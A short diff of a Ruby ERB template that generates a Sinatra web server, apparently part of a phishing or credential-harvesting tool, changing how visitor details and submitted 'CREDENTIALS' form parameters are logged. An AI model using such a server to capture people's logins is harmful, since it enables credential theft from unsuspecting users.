@@ -26,7 +26,7 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 		set :payload_path,	self[:payload]
 	<% end %>
 	not_found do
-		$stdout.puts "#{Time.now} - IP #{request.ip} PORT #{request.port} - PATH #{request.path} - #{request.forwarded?} - #{request.user_agent}"
+		log "#{Time.now} - IP #{request.ip} PORT #{request.port} - PATH #{request.path} - #{request.forwarded?} - #{request.user_agent}"
 		redirect to "/"
 	end
 
@@ -61,7 +61,6 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 
 	<% self[:forms_routes].each do |route| %>
 	<%= route[0] %> "<%=route[1]%>" do
-		$stdout.puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
 		process_info
 		process_cred
 
